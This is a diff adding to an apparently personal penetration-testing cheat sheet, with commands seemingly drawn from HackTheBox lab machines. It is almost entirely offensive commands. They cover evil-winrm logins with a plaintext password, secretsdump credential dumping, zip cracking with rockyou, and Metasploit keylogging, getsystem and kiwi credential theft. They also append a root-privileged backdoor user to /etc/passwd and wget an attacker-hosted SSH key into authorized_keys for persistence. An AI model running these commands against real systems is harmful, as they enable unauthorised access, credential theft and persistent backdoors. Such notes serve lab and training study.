@@ -289,3 +289,71 @@ axel -a -n 20 -o report_axel.pdf https://www.offensive-security.com/reports/pene
 WINDOWS CMD
 Recursive search: where /r c:\ user.txt
 
+WINDOWS EVIL-WINRM
+git clone https://github.com/Hackplayers/evil-winrm
+cd evil-winrm/
+cat Gemfile
+sudo gem install winrm winrm-fs stringio
+ruby evil-winrm.rb -i heist.htb -u Chase -p 'Q4)sJu\Y8qz*A3?d'
+
+KERBEROAST
+impacket-secretsdump egotistical-bank.local/svc_loanmgr@10.129.152.219
+
+
+
+
+
+FCRACKZIP
+fcrackzip -u -v -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip
+
+METASPLOIT POST EXPLOITATION
+screenshot
+keyscan_start
+keyscan_dump
+keyscan_stop
+load powershell
+powershell_execute "$PSVersionTable.PSVersion"
+load kiwi
+getsystem
+creds_msv
+
+
+
+WRITABLE /etc/passwd
+echo "toor1:aaKNIEDOaueR6:0:0:toor:/root:/bin/bash" >> /etc/passwd 
+Credentials "toor1/foo"
+
+COPY A FILE
+cat file.txt|xclip
+
+SSH
+ssh-keygen -f mykey
+password
+python -m http.server 7878
+
+cd && mkdir .ssh && cd .ssh && wget http://10.10.14.42:7878/mykey.pub && mv mykey.pub authorized_keys
+
+ssh -i mykey developer@horizontall.htb
+password
+
+SSH port binding
+ssh -L [LOCAL_IP:]LOCAL_PORT:DESTINATION:DESTINATION_PORT [USER@]SSH_SERVER
+ssh -p 2222 -L 5555:localhost:5555 kristi@explore.htb
+
+BURP INJECT HEADER
+Burp suite doesnt allow to inject a header but we can match & replace something like User-Agent and put what we need.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
